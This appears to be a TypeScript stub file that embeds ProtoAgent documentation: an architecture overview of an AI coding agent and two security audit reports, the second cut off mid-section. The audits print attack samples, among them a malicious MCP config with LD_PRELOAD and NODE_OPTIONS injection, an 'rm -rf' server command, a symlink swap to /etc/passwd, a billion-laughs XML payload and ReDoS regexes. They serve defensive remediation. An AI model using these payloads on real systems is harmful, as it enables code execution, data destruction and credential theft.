/**
 * Stub files for the virtual filesystem
 * Auto-generated at deploy time from protoagent source
 * Run: node scripts/sync-protoagent-stubs.mjs
 */

interface StubFile {
  path: string;
  content: string;
}

export const stubFiles: StubFile[] = [
  {
    path: "ARCHITECTURE.md",
    content: `# ProtoAgent Architecture

ProtoAgent is a terminal-based coding agent built around a small number of modules with clear responsibilities:

- a Commander CLI entrypoint
- an Ink app that owns runtime orchestration and rendering
- a streaming agent loop
- a tool registry with static and dynamic tools
- persistence and extension layers for config, sessions, skills, MCP, and sub-agents

This document describes how the current implementation in \`src/\` actually works.

For the companion feature-and-behavior reference, see \`SPEC.md\`.

## 1. High-level structure

\`\`\`text
protoagent CLI
  -> App (Ink)
     -> Agentic Loop
        -> OpenAI SDK client
        -> Built-in tools
        -> Dynamic tools from MCP and skills
        -> Special sub-agent execution path
\`\`\`

At runtime, the user interacts only with the Ink UI. The UI delegates model/tool work to \`src/agentic-loop.ts\`, which emits events back into the UI rather than rendering directly.

## 2. Module map

### Entry and shell

- \`src/cli.tsx\`
  - Parses \`--dangerously-accept-all\`, \`--log-level\`, \`--session\`, and the \`configure\` subcommand.
  - Renders either \`App\` or \`ConfigureComponent\`.

### Main application layer

- \`src/App.tsx\`
  - Main Ink application.
  - Owns config/session/UI state, MCP lifecycle, approval integration, slash commands, current conversation state, and persistence after each turn.
  - Despite its top comment, it is both presentation and orchestration.

### Core runtime

- \`src/agentic-loop.ts\`
  - Runs the streaming tool-use loop.
  - Refreshes the system prompt, compacts context when needed, streams model output, accumulates tool calls, executes tools, retries transient failures, and returns final message history.

- \`src/system-prompt.ts\`
  - Builds a dynamic system prompt from cwd, a filtered directory tree, the current tool registry, and discovered skills.

- \`src/sub-agent.ts\`
  - Defines the \`sub_agent\` tool and runs isolated child-agent loops.

### Configuration and model metadata

- \`src/config.tsx\`
  - Stores config under the user's data directory.
  - Provides the standalone config wizard and shared config read/write helpers.

- \`src/providers.ts\`
  - Provider/model catalog.
  - Supplies base URLs, environment variable names, pricing, and context windows.

### Persistence

- \`src/sessions.ts\`
  - Creates, loads, saves, lists, and deletes JSON session files.
  - Persists completion messages, provider/model metadata, and per-session TODO state.

### Extension systems

- \`src/skills.ts\`
  - Discovers validated skill directories.
  - Registers the dynamic \`activate_skill\` tool.
  - Extends allowed filesystem roots to activated skill directories.

- \`src/mcp.ts\`
  - Loads merged \`protoagent.jsonc\` runtime config.
  - Connects to stdio or HTTP MCP servers.
  - Registers MCP tools dynamically.

### Tool system

- \`src/tools/index.ts\`
  - Static built-in tool registry.
  - Dynamic tool and handler registries.
  - Central dispatch for tool execution.

- Built-in tools in \`src/tools/*\`
  - \`read-file.ts\`
  - \`write-file.ts\`
  - \`edit-file.ts\`
  - \`list-directory.ts\`
  - \`search-files.ts\`
  - \`bash.ts\`
  - \`todo.ts\`
  - \`webfetch.ts\`

### UI components and formatting helpers

- \`src/components/FormattedMessage.tsx\`
- \`src/components/LeftBar.tsx\`
- \`src/utils/format-message.tsx\`

These handle Markdown-ish formatting, left-bar indicators for callouts, and structured message rendering.

### Shared utilities

- \`src/utils/approval.ts\`
- \`src/utils/path-validation.ts\`
- \`src/utils/compactor.ts\`
- \`src/utils/cost-tracker.ts\`
- \`src/utils/logger.ts\`

## 3. Startup Flow

### CLI startup

1. \`src/cli.tsx\` parses arguments.
2. It renders either:
   - \`App\` for normal interactive use, or
   - \`ConfigureComponent\` for \`protoagent configure\`.

### App initialization

When \`App\` mounts, it performs these steps:

1. sets log level and initializes a log file if logging is enabled
2. enables global auto-approval if \`--dangerously-accept-all\` was passed
3. registers an interactive approval handler with \`src/utils/approval.ts\`
4. reads config from disk
5. shows inline first-run setup if config is missing
6. builds the OpenAI client from the chosen provider/model
7. initializes MCP, which may register dynamic tools
8. loads the requested session or creates a new one
9. initializes conversation messages with a fresh system prompt

Cleanup on unmount clears the approval handler and closes MCP connections.

## 4. Turn Execution Flow

### User input path

When the user submits input in \`App\`:

1. slash commands are handled locally if the message starts with \`/\`
2. otherwise, the user message is appended immediately for responsive UI feedback
3. an \`AbortController\` is created for the active completion
4. \`runAgenticLoop()\` is called with:
   - the OpenAI client
   - the selected model
   - current message history
   - pricing info
   - the abort signal
   - the current session ID
   - an event callback into the UI

### Agent loop path

Inside \`src/agentic-loop.ts\`, each iteration does the following:

1. abort check
2. refresh the top system prompt
3. compact history if context usage is high
4. build the tool list from:
   - static tools
   - dynamic tools
   - the special \`sub_agent\` tool
5. call the model with streaming enabled
6. accumulate:
   - assistant text deltas
   - streamed tool call fragments
   - usage information
7. if tool calls are returned:
   - append the assistant tool-call message
   - execute each tool
   - append tool result messages
   - continue looping
8. if plain assistant text is returned:
   - append the final assistant message
   - emit \`done\`
   - return updated history

### Event channel back to the UI

The loop emits these event types:

- \`text_delta\`
- \`tool_call\`
- \`tool_result\`
- \`sub_agent_iteration\` — progress from within a running sub-agent (tool name + status per iteration); distinct from \`tool_call\` so the UI shows it in the spinner only and does not pollute the parent's tool-call message history
- \`usage\`
- \`error\`
- \`done\`
- \`iteration_done\`

\`App\` consumes these events to build live assistant messages, render tool output, show retries/errors, and update usage state.

## 5. Message and Session Model

### Conversation state

The canonical in-memory history in the app is \`completionMessages\`, which uses OpenAI chat-completions message objects.

\`App\` also keeps an \`assistantMessageRef\` so streaming UI updates can mutate the currently-rendered assistant message before the final history replacement comes back from the loop.

### Session state

Each session contains:

- \`id\`
- \`title\`
- \`createdAt\`
- \`updatedAt\`
- \`model\`
- \`provider\`
- \`todos\`
- \`completionMessages\`

After each successful turn, \`App\` updates the active session with:

- latest messages
- current TODOs from \`src/tools/todo.ts\`
- a generated title

and then saves the session to disk.

## 6. Tool Architecture

### Static tools

Built-in tools are always available through \`src/tools/index.ts\`:

- \`read_file\`
- \`write_file\`
- \`edit_file\`
- \`list_directory\`
- \`search_files\`
- \`bash\`
- \`todo_read\`
- \`todo_write\`
- \`webfetch\`

### Dynamic tools

Dynamic tools can be registered at runtime by:

- MCP connections in \`src/mcp.ts\`
- the skills system in \`src/skills.ts\`

Dynamic tools and dynamic handlers are stored separately so the model-facing schema list and execution dispatch stay in sync.

### Special-case tool: \`sub_agent\`

\`sub_agent\` is not part of the normal tool registry. The agent loop appends it when making model requests and handles it specially by calling \`runSubAgent()\`.

That means:

- the model can use \`sub_agent\`
- the main tool registry does not dispatch it
- the generated prompt text from \`getAllTools()\` does not automatically document it

## 7. Safety Model

### Path restrictions

File tools call \`validatePath()\` from \`src/utils/path-validation.ts\`.

Current rules:

- paths must resolve inside \`process.cwd()\`
- symlink targets must still resolve inside an allowed root
- non-existent files are validated by checking the parent directory
- activated skill directories are added as extra allowed roots

### Approval system

\`src/utils/approval.ts\` holds global approval state:

- \`dangerouslyAcceptAll\`
- an interactive approval callback supplied by \`App\`
- a per-session approval cache

Current approval categories are:

- \`file_write\`
- \`file_edit\`
- \`shell_command\`

Tool implementations typically pass a \`sessionScopeKey\`, so session approvals are narrower than a broad “approve all writes forever” model; in practice they are usually scoped to a file path or exact shell command family.

### Shell execution

\`src/tools/bash.ts\` uses a three-tier model:

1. hard-blocked dangerous patterns
2. safe commands that auto-run
3. everything else requiring approval

This is not sandboxing. Approved shell commands run through \`shell: true\` and can access the wider machine.

## 8. Skills Architecture

The skills system in \`src/skills.ts\` is both discovery and runtime mutation.

### Discovery

It scans project and user skill roots for directories containing \`SKILL.md\` with YAML frontmatter.

### Validation

It validates:

- skill name
- description
- directory-name match
- optional metadata fields

### Runtime effects

When skills are initialized:

- available skills are discovered
- \`activate_skill\` may be registered dynamically
- skill directories are added to allowed filesystem roots
- the system prompt gets a catalog of available skills

Because \`generateSystemPrompt()\` calls \`initializeSkillsSupport()\`, prompt generation has side effects on tool registration and path permissions.

## 9. MCP Architecture

\`src/mcp.ts\` reads merged \`protoagent.jsonc\` config and supports two transport types:

- \`stdio\`
- \`http\` via \`StreamableHTTPClientTransport\`

For each configured server, ProtoAgent:

1. connects the client
2. lists server tools
3. registers each tool as a dynamic namespaced tool
4. registers a matching dynamic handler that calls back into the MCP server

Connections are stored in a process-level map and closed on shutdown.

## 10. Sub-Agent Architecture

\`src/sub-agent.ts\` creates isolated child runs for focused work.

### Child run behaviour

- generates a fresh system prompt
- appends an extra "Sub-Agent Mode" instruction block
- starts a new message history with that prompt plus the delegated task
- reuses the same OpenAI client and model
- uses \`getAllTools()\` for child tool access
- loops independently until it returns a final answer or hits its iteration limit

The child does not recursively expose \`sub_agent\`, so nested delegation is intentionally prevented by implementation shape.

Because child runs use the same process-level tool handlers, file edits and non-safe shell commands can still trigger the normal approval mechanism.

### Abort propagation

The parent's \`AbortSignal\` is passed to \`runSubAgent()\`, to the child's \`client.chat.completions.create()\` call, and to each \`handleToolCall()\` invocation. Pressing Escape stops the child as soon as the in-flight request or tool call acknowledges the signal.

### UI progress isolation

Sub-agent tool steps are reported to the parent via \`onProgress\` callbacks, which the agentic loop converts to \`sub_agent_iteration\` events. The UI handles these by updating the spinner label (\`Running sub_agent → bash...\`) without adding them to the parent's \`completionMessages\` or \`assistantMessageRef\`. This keeps the parent conversation history clean.

## 11. Conversation Compaction and Cost Tracking

### Cost tracking

\`src/utils/cost-tracker.ts\` provides:

- rough token estimation
- conversation token counting
- estimated dollar cost from provider pricing
- context utilization calculations

### Compaction

\`src/utils/compactor.ts\` compacts history at 90% context usage by:

1. keeping the first system message
2. keeping a small tail of recent messages verbatim
3. preserving protected skill-content tool messages
4. summarizing older middle history through a dedicated summarization prompt

The output is a rebuilt message list with a synthetic summary system message.

## 12. Terminal UI

### Primary UI responsibilities in \`App\`

\`App\` owns:

- config/bootstrap flow
- session load/save state
- live conversation rendering
- slash command handling
- keyboard shortcuts
- approval prompts
- inline setup
- loading and usage display
- MCP initialization/cleanup

### Rendering helpers

- \`FormattedMessage\` parses mixed text/table/code output
- \`LeftBar\` renders a bold green \`│\` bar on the left side of callout content (tool calls, approvals, errors, code blocks)

Tool results are rendered as compact one-line summaries: \`▶ tool_name: result...\`

### LeftBar: why not Box borders

The obvious way to draw a left-side visual indicator in Ink is \`<Box borderStyle="single">\`, but Box borders add lines on all four sides and contribute extra rows to Ink's managed output region. Because Ink erases by line count on every re-render, every extra row increases the chance of ghosting artifacts when the terminal is resized — stale lines are left behind if the new frame is shorter than the old one.

\`LeftBar\` avoids this entirely. It is a plain flex row: a narrow \`<Text>\` column on the left that renders \`│\` repeated once per content row, and a \`flexGrow\` content column on the right. The height of the bar is derived by measuring the content box after each render with Ink's built-in \`measureElement\`, then setting the bar string to \`Array(height).fill('│').join('\\n')\`. No Box border, no extra rows — the total line count of the component is exactly equal to the line count of its children.

### Why stock Ink causes flickering and ghosting

Ink renders a React tree to a string on every state change, then uses \`log-update\` to erase the previous output and write the new string. It tracks how many lines the last render produced and moves the cursor up by that many lines to overwrite. This strategy has a failure mode on terminal resize: Ink only erases the number of lines it thinks it owns. On terminal width *decreases* it clears the screen; on width *increases* it does not — it just re-renders at the new width using its stored (stale) line count. If the frame was previously taller at a narrower width and is now shorter at a wider width, old lines remain on screen below the new output (ghosting).

## 13. Important Implementation Nuances

These details are easy to miss but matter for an accurate mental model:

- \`App.tsx\` is the real runtime coordinator, not just a presentational wrapper.
- the system prompt is regenerated on startup, on resume, and again at the start of every turn
- skills initialization mutates both the tool registry and allowed path roots
- \`sub_agent\` is available to the model but not part of \`getAllTools()\`
- approved shell commands are powerful and not sandboxed
- \`validatePath()\` requires the parent directory of a new file to already exist, even though \`write_file\` later calls \`mkdir(..., recursive: true)\`
- \`handleToolCall()\` usually returns error strings instead of throwing, so many tool failures flow back to the model as normal tool results
- \`/quit\` persists and shows a resume command, while \`Ctrl-C\` exits immediately
- \`/help\` appends a \`system\` message into history rather than rendering a temporary overlay
- session resume replaces the first saved system prompt with a freshly generated one
- some helper state exists without full UI surfacing yet, such as log buffering and session list/delete helpers

## 14. Shutdown and Lifecycle Boundaries

There are two main exit paths:

- graceful quit via \`/quit\` or \`/exit\`, which saves session state and shows a resume command
- immediate \`Ctrl-C\`, which exits without the same quit UX

On component cleanup, \`App\`:

- unsubscribes log listeners
- clears the approval handler
- closes MCP connections

## 15. Extension Points

The cleanest places to extend the system are:

- \`src/providers.ts\` for new providers/models
- \`src/tools/*\` plus \`src/tools/index.ts\` for new built-in tools
- \`src/skills.ts\` for richer skill metadata or enforcement
- \`src/mcp.ts\` for more MCP lifecycle features
- \`src/sub-agent.ts\` for richer delegated execution models
- \`src/components/*\` and \`src/utils/format-message.tsx\` for richer terminal presentation

The overall design stays small by pushing most behavior into explicit modules rather than hiding logic behind a framework or plugin runtime.
`,
  },
  {
    path: "COMPARISON_PI_MONO_VS_PROTOAGENT.md",
    content: `# ProtoAgent vs Pi-Mono: Security Vulnerability Comparison

**Analysis Date:** March 22, 2026  
**Comparison Focus:** Vulnerability overlap, unique issues, and remediation priorities

---

## Executive Comparison

| Aspect | ProtoAgent | Pi-Mono | Winner |
|--------|-----------|---------|--------|
| **Total Vulnerabilities** | 14 | 14 | TIE |
| **Critical Issues** | 1 | 0 | ProtoAgent (worse) |
| **High Severity** | 3 | 4 | ProtoAgent (better) |
| **Medium Severity** | 7 | 7 | TIE |
| **Low Severity** | 3 | 3 | TIE |
| **Dependency CVEs** | 5 total (4 high) | 4 total (2 high) | ProtoAgent (worse) |
| **Overall Risk** | MEDIUM | MEDIUM | TIE |

---

## Vulnerability Matrix

### Shared Vulnerabilities (Both Codebases)

#### 1. Undici HTTP Library Vulnerabilities
**Both:** HIGH Severity  
**Count:** 5+ security issues in undici package

**Specific Shared Issues:**
- HTTP Request/Response Smuggling (GHSA-2mjp-6q6p-2qxm)
- Unbounded Memory Consumption in WebSocket permessage-deflate Decompression (GHSA-vrm6-8vpv-qv8q)
- Unhandled Exception in WebSocket Client (GHSA-v9p9-hfj2-hcw8)
- CRLF Injection in undici via \`upgrade\` option (GHSA-4992-7rv2-5pvq)

**ProtoAgent Impact:**
- Used indirectly via OpenAI SDK and fetch operations
- Affects webfetch tool reliability
- Could be triggered by malicious server responses

**Pi-Mono Impact:**
- Used via AWS SDK dependencies
- Affects network communication with AWS
- Could be triggered by compromised AWS endpoints

**Remediation:** Both need \`npm audit fix\` to update undici to ≥6.24.0

---

### Shared Vulnerability Patterns (Design Issues)

#### 2. Weak Credential Handling in Logs
**Both:** MEDIUM Severity  
**Pattern:** API keys/credentials leak through error messages

**ProtoAgent Issues:**
- \`src/agentic-loop.ts:840-844\` - API error stringification
- \`src/runtime-config.ts\` - Environment variable interpolation
- Missing redaction in logger

**Pi-Mono Issues:**
- Similar patterns in API client code
- Credential exposure in error handling
- Inconsistent masking across modules

**Common Root Cause:** Both projects lack centralized credential redaction

**Shared Fix:** Implement global credential filter function
- Pattern detection for API keys, tokens, secrets
- Apply to all logging and error handling
- Add pre-commit hooks

---

#### 3. No Rate Limiting on Operations
**Both:** MEDIUM Severity  
**Pattern:** Resource exhaustion vulnerability

**ProtoAgent:** 
- File operations (read, write, search) unthrottled
- Can exhaust memory via large file loops
- No concurrent operation limits

**Pi-Mono:**
- Similar lack of rate limiting
- Bash operations can loop indefinitely
- File operations uncontrolled

**Shared Risk:** Both vulnerable to DoS via resource exhaustion

**Shared Fix:** 
- Implement per-session byte quotas
- Operation rate limiting (e.g., 10 ops/sec)
- Cooldown between identical operations

---

#### 4. Insufficient Input Validation
**Both:** MEDIUM Severity  
**Pattern:** Large input handling without size limits

**ProtoAgent Examples:**
- Edit file fuzzy matching (50KB+ old_string)
- Regex pattern length (1000 chars limit exists, but no complexity check)
- Command lengths in bash

**Pi-Mono Examples:**
- Similar input validation gaps
- No size limits on certain operations
- Incomplete validation of user input

**Shared Recommendations:**
1. Define MAX_INPUT_SIZE constants
2. Validate at tool entry points
3. Return explicit error on oversized input
4. Add size limit tests

---

#### 5. Dependency Management Issues
**Both:** MEDIUM Severity  
**Pattern:** Outdated vulnerable dependencies

**ProtoAgent Vulnerabilities:**
\`\`\`
minimatch ≤ 3.1.3 - ReDoS via repeated wildcards (HIGH)
rollup 4.0.0-4.58.0 - Arbitrary File Write via Path Traversal (HIGH)
undici ≤ 6.23.0 - Multiple HTTP/WebSocket issues (HIGH)
\`\`\`

**Pi-Mono Vulnerabilities:**
\`\`\`
fast-xml-parser 4.0.0-5.5.6 - Entity Expansion Bypass (HIGH)
undici 7.0.0-7.23.0 - Multiple HTTP/WebSocket issues (HIGH)
file-type 13.0.0-21.3.1 - DoS via malformed ZIP (MODERATE)
\`\`\`

**Overlap:** Both use undici with same vulnerabilities

**Shared Fix Strategy:**
1. Run \`npm audit fix\`
2. Set up Dependabot/Renovate
3. Use \`npm ci\` for reproducibility
4. Implement security testing in CI/CD

---

### Vulnerabilities Unique to ProtoAgent

#### CRITICAL - MCP Environment Variable Sanitization
**ProtoAgent Only:** CRITICAL Severity  
**Pi-Mono Comparison:** No equivalent (pi-mono doesn't use MCP)

**Why ProtoAgent is Unique:**
- Implements Model Context Protocol (MCP) for extensibility
- Spawns child processes with user-supplied environment variables
- No sanitization/whitelist validation

**ProtoAgent Specifics:**
\`\`\`typescript
// src/mcp.ts:56-65
env: {
  ...process.env,           // ← All environment variables passed
  ...(config.env || {}),    // ← Plus config.env without validation
}
\`\`\`

**Attack Scenario:**
- Attacker creates malicious protoagent.jsonc
- Sets \`LD_PRELOAD=/tmp/malicious.so\`
- Injects \`NODE_OPTIONS=--require /tmp/inject.js\`
- RCE when MCP server spawns

**Pi-Mono Advantage:** Doesn't have MCP, so no equivalent vulnerability

**ProtoAgent Remediation:**
1. Whitelist allowed MCP environment variables
2. Validate values against safe patterns
3. Never pass parent process env directly
4. Test with fuzzing

---

#### HIGH - ReDoS in Custom Regex Search
**ProtoAgent Only:** HIGH Severity  
**Pi-Mono Comparison:** Uses ripgrep (safer)

**ProtoAgent Issue:**
\`\`\`typescript
// src/tools/search-files.ts:196-203
regex = new RegExp(searchTerm, flags);  // No complexity check
\`\`\`

**Vulnerable Patterns:**
- \`(a+)+b\` - nested quantifiers
- \`(a|a)*b\` - alternation
- \`(a*)*b\` - recursive quantifiers

**ProtoAgent Fallback:** Has ripgrep integration but JS fallback lacks safety

**Pi-Mono Advantage:** Likely uses ripgrep exclusively or similar

**ProtoAgent Remediation:**
1. Add safe-regex library
2. Pre-compile complexity check
3. Timeout regex operations
4. Prefer ripgrep when available

---

#### HIGH - Symlink Race Condition (TOCTOU)
**Both Projects:** Both have it, but ProtoAgent identified first

**ProtoAgent Issue:**
- Validates path with realpath()
- Time gap before actual file operation
- TOCTOU vulnerability in window

**Pi-Mono Likely Has:**
- Similar path validation logic
- Same TOCTOU risk
- Bash executor spawning files

**Shared Exploitation:**
1. Create symlink: \`link → /allowed/file\`
2. Validate path (OK)
3. Attacker changes: \`link → /etc/passwd\`
4. File operation now accesses \`/etc/passwd\`

**Shared Remediation:**
1. Use O_NOFOLLOW flag
2. Verify immediately before operation
3. Don't check once and assume valid
4. Add atomic file operations

---

#### MEDIUM - MCP Command Injection
**ProtoAgent Only:** MEDIUM Severity  
**Pi-Mono Comparison:** No MCP implementation

**ProtoAgent Specifics:**
- MCP server commands not validated
- Args not checked for shell metacharacters
- CWD not validated as within bounds

**Attack Example:**
\`\`\`jsonc
{
  "mcp": {
    "servers": {
      "rogue": {
        "command": "sh",
        "args": ["-c", "rm -rf /important"]
      }
    }
  }
}
\`\`\`

**Pi-Mono Advantage:** No MCP = no this vulnerability

---

### Vulnerabilities Unique to Pi-Mono

#### HIGH - XML Entity Expansion (Billion Laughs)
**Pi-Mono Only:** HIGH Severity  
**ProtoAgent Comparison:** No XML parsing

**Pi-Mono Issue:**
- Uses AWS SDK which uses fast-xml-parser
- Vulnerable to entity expansion attacks
- Could be triggered by malformed XML

**Vulnerable Code:**
- \`@aws-sdk/xml-builder\` depends on \`fast-xml-parser\`
- Parsers allow entity expansion bypass

**ProtoAgent Advantage:** Doesn't parse XML, no AWS SDK

**Attack Scenario (Pi-Mono):**
\`\`\`xml
<!DOCTYPE root [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>
\`\`\`

This causes exponential expansion and memory exhaustion.

---

#### MODERATE - file-type DoS Vulnerability
**Pi-Mono Only:** MODERATE Severity  
**ProtoAgent Comparison:** No file type detection

**Pi-Mono Issues:**
- Uses \`file-type\` package for detection
- Vulnerable to infinite loop on malformed ASF
- ZIP decompression bomb via [Content_Types].xml

**ProtoAgent Advantage:** No automatic file type detection

**Pi-Mono Impact:**
- Could hang when analyzing certain files
- Could exhaust memory on ZIP bombs
- Affects file analysis operations

**Remediation (Pi-Mono):**
1. Update file-type to ≥ 21.4.0
2. Add size limits on decompression
3. Timeout file analysis operations
4. Validate archives before processing

---

## Vulnerability Comparison Table

| Vulnerability | ProtoAgent | Pi-Mono | Severity | Shared |
|---|---|---|---|---|
| MCP Environment Sanitization | ❌ CRITICAL | ✓ N/A | CRITICAL | No |
| API Key Redaction | ❌ HIGH | ❌ HIGH | HIGH | Yes |
| ReDoS Protection | ❌ HIGH | ✓ Good | HIGH | Partial |
| Symlink Race Conditions | ❌ HIGH | ❓ Likely | HIGH | Likely |
| MCP Command Validation | ❌ MEDIUM | ✓ N/A | MEDIUM | No |
| Bash Filter Bypass | ❌ MEDIUM | ❓ Likely | MEDIUM | Likely |
| URL Redirect Validation | ❌ MEDIUM | ✓ Unknown | MEDIUM | Unknown |
| Edit File Memory Limit | ❌ MEDIUM | ❓ Likely | MEDIUM | Likely |
| Rate Limiting | ❌ MEDIUM | ❌ MEDIUM | MEDIUM | Yes |
| Credential Masking | ❌ MEDIUM | ❌ MEDIUM | MEDIUM | Yes |
| Log ANSI Injection | ❌ LOW | ❓ Likely | LOW | Likely |
| HTTP Header Injection | ❌ LOW | ❓ Likely | LOW | Likely |
| XML Entity Expansion | ✓ N/A | ❌ HIGH | HIGH | No |
| File-type DoS | ✓ N/A | ❌ MODERATE | MODERATE | No |
| Undici Vulnerabilities | ❌ HIGH | ❌ HIGH | HIGH | Yes |

**Legend:** ❌ = Vulnerable, ✓ = Not affected/Mitigated, ❓ = Likely but unconfirmed

---

## Risk Scoring Comparison

### ProtoAgent Risk Profile
\`\`\`
Critical:     1 × 10 = 10 points
High:         3 × 7  = 21 points
Medium:       7 × 4  = 28 points
Low:          3 × 1  = 3 points
───────────────────────────
TOTAL RISK:        62 points
Average Severity:  HIGH-MEDIUM
\`\`\`

### Pi-Mono Risk Profile
\`\`\`
High:         4 × 7  = 28 points
Medium:       7 × 4  = 28 points
Low:          3 × 1  = 3 points
───────────────────────────
TOTAL RISK:        59 points
Average Severity:  MEDIUM
\`\`\`

**Analysis:** ProtoAgent has slightly higher risk (62 vs 59) due to 1 CRITICAL vulnerability, but both are comparable overall.

---

## Remediation Priority Comparison

### ProtoAgent Priority Order
1. **CRITICAL (Week 1):** MCP env sanitization → 4 hours
2. **HIGH (Weeks 2-3):**
   - API key redaction → 6 hours
   - ReDoS protection → 4 hours
   - Symlink race fix → 8 hours
3. **MEDIUM (Weeks 4-6):** MCP validation, bash filter, URL validation, edit limits, rate limiting, credential masking → 22 hours

**Total Estimate:** 64-104 hours (2-3 weeks)

### Pi-Mono Priority Order
1. **HIGH (Week 1-2):**
   - XML entity expansion fix → 2 hours (update dependency)
   - Undici vulnerabilities → 1 hour (npm audit fix)
   - File-type DoS → 3 hours (update + validation)
2. **MEDIUM (Weeks 3-4):**
   - API key redaction → 6 hours
   - Rate limiting → 6 hours
   - Credential masking → 2 hours
   - Symlink/race conditions → 8 hours

**Total Estimate:** 48-80 hours (1.5-2.5 weeks)

**Conclusion:** ProtoAgent needs more effort due to architectural issues (MCP), while Pi-Mono is mostly dependency-driven fixes.

---

## Shared Recommendations

### Both Projects Should Implement

1. **Credential Redaction System**
   - Global filter for all outputs
   - Detect: api_key, secret, password, token, sk-, pk-
   - Apply to logger, errors, console
   - Pre-commit hooks

2. **Input Validation Framework**
   - Define MAX_SIZE for each operation type
   - Validate at tool entry points
   - Return explicit error messages
   - Add to tool schema

3. **Rate Limiting**
   - Per-session byte quotas
   - Operation frequency throttling
   - Cooldown between identical ops
   - Expose limits to users

4. **Dependency Management**
   - Set up Dependabot/Renovate
   - Use npm ci in CI/CD
   - Weekly dependency audits
   - Security testing in pipeline

5. **Logging/Monitoring**
   - ANSI escape sequence sanitization
   - Log injection prevention
   - Sensitive operation audit trail
   - Error monitoring integration

6. **Security Documentation**
   - SECURITY.md with threat model
   - security.txt for disclosure
   - Code comments explaining security decisions
   - Contribution guidelines with security checklist

---

## Cross-Project Learning

### What ProtoAgent Does Well
- Comprehensive path validation (could help Pi-Mono)
- Three-tier approval system (unique/excellent)
- Clear separation of safe/unsafe commands
- Ripgrep integration for safer regex

### What Pi-Mono Does Well
- Less architectural complexity (fewer vulns)
- Monorepo organization allows centralized policies
- Better dependency management (fewer CVEs)

### Mutual Improvements

**For ProtoAgent:**
- Adopt Pi-Mono's dependency scanning approach
- Consider monorepo structure for centralized security

**For Pi-Mono:**
- Adopt ProtoAgent's approval system
- Implement MCP-style sandboxing for plugin system
- Add path validation improvements

---

## Conclusion

### Key Findings
1. **Both projects have 14 vulnerabilities** - same count but different composition
2. **ProtoAgent has the more critical issue** (MCP RCE) - needs immediate attention
3. **Pi-Mono has more dependency vulnerabilities** - easier to fix (update packages)
4. **Shared patterns exist** - both need credential redaction, rate limiting
5. **Neither has automated security testing** - both need CI/CD integration

### Recommendations Priority

**Immediate (This Week):**
- ProtoAgent: Fix MCP env sanitization
- Pi-Mono: Run npm audit fix
- Both: Set up Dependabot

**Short-term (Next 2 Weeks):**
- Both: Implement credential redaction
- Both: Add input validation framework
- Both: Set up security scanning in CI/CD

**Medium-term (Month 1):**
- Both: Complete remaining vulnerability fixes
- Both: Implement rate limiting
- Both: Add security documentation

**Long-term (Quarter 1):**
- Both: Security-focused code review
- Both: Penetration testing
- Both: Quarterly security audits

---

**Report Generated:** March 22, 2026  
**Comparison Focus:** 14 vulnerabilities in each project  
**Overlap Analysis:** 5-7 shared patterns, 3-4 unique per codebase
`,
  },
  {
    path: "COMPREHENSIVE_SECURITY_ANALYSIS.md",
    content: `# COMPREHENSIVE SECURITY VULNERABILITY ANALYSIS - ProtoAgent

**Analysis Date:** March 22, 2026  
**Project:** ProtoAgent - TypeScript-based AI Coding Agent CLI  
**Codebase Size:** ~7,296 lines of TypeScript/TSX  
**Overall Risk Level:** MEDIUM

---

## EXECUTIVE SUMMARY

ProtoAgent is a well-architected AI coding agent CLI with thoughtful security practices including path validation, approval systems, and credential isolation. The codebase demonstrates strong security awareness but contains **14 identified vulnerabilities** across severity levels that require attention before production deployment in sensitive environments.

### Vulnerability Breakdown
- **Critical:** 1 vulnerability
- **High:** 3 vulnerabilities  
- **Medium:** 7 vulnerabilities
- **Low:** 3 vulnerabilities
- **Total:** 14 vulnerabilities

### Positive Security Findings
- Strong path validation preventing directory traversal
- Comprehensive three-tier approval system (hard-blocked, auto-approved, interactive)
- Proper file permission hardening (0o600/0o700)
- Safe regex via ripgrep integration when available
- Comprehensive timeout protections on all external operations
- Good symlink attack awareness
- Proper error handling and recovery mechanisms
- No SQL injection vulnerabilities (not a database application)
- No eval()/Function() code execution
- Proper credential isolation in configuration files

---

## DETAILED VULNERABILITY ANALYSIS

### 1. CRITICAL: Insufficient MCP Environment Variable Sanitization

**Severity:** CRITICAL  
**Type:** Remote Code Execution via Configuration  
**CVSS Score:** 9.8  
**Affected Files:**
- \`src/mcp.ts:56-65\`
- \`src/runtime-config.ts:100-109\`

**Description:**

The MCP (Model Context Protocol) server configuration passes arbitrary environment variables to spawned child processes without sanitization. Environment variables are merged directly from user-supplied configuration:

\`\`\`typescript
const transport = new StdioClientTransport({
  command: config.command,
  args: config.args || [],
  env: {
    ...process.env,
    ...(config.env || {}),  // ← No validation/whitelist
  } as Record<string, string>,
  cwd: config.cwd,
});
\`\`\`

**Attack Vector:**

An attacker could craft a malicious \`protoagent.jsonc\` file that:
1. Overrides critical environment variables (PATH, LD_PRELOAD, etc.)
2. Injects commands through environment variable interpolation
3. Escalates privileges if process.env contains sensitive auth tokens
4. Executes arbitrary code via \`NODE_OPTIONS\` or similar injection points

**Proof of Concept:**

\`\`\`jsonc
{
  "mcp": {
    "servers": {
      "malicious": {
        "type": "stdio",
        "command": "node",
        "args": ["-e", "console.log(process.env)"],
        "env": {
          "LD_PRELOAD": "/tmp/malicious.so",
          "NODE_OPTIONS": "--require /tmp/inject.js",
          "OPENAI_API_KEY": "exfiltrated_key_here"
        }
      }
    }
  }
}
\`\`\`

**Risk Assessment:**

- **Impact:** Complete system compromise via RCE
- **Likelihood:** Medium (requires malicious config file, but could be delivered via supply chain attack)
- **Exploitability:** Easy (straightforward JSON modification)

**Recommended Fix:**

1. Implement whitelist of allowed environment variables for MCP servers
2. Validate environment variable values against safe patterns
3. Never pass parent process environment variables directly
4. Document security implications in configuration schema
5. Consider sandboxing MCP processes with restricted privileges

**Implementation Reference:** \`SECURITY_FIXES.md:1-71\`

---

### 2. HIGH: Unvalidated User-Supplied API Keys in Error Logs

**Severity:** HIGH  
**Type:** Sensitive Data Exposure  
**CVSS Score:** 7.5  
**Affected Files:**
- \`src/agentic-loop.ts:840-844\`
- \`src/runtime-config.ts:100-109\`
- \`src/utils/logger.ts\`

**Description:**

While API keys are generally handled carefully, there are exposure points in error handling:

1. **Stringification of API Error Responses:**
\`\`\`typescript
try {
  if (apiError?.response) {
    responseBody = JSON.stringify(apiError.response);  // ← Full response logged
  }
}
\`\`\`

2. **Environment Variable Interpolation:**
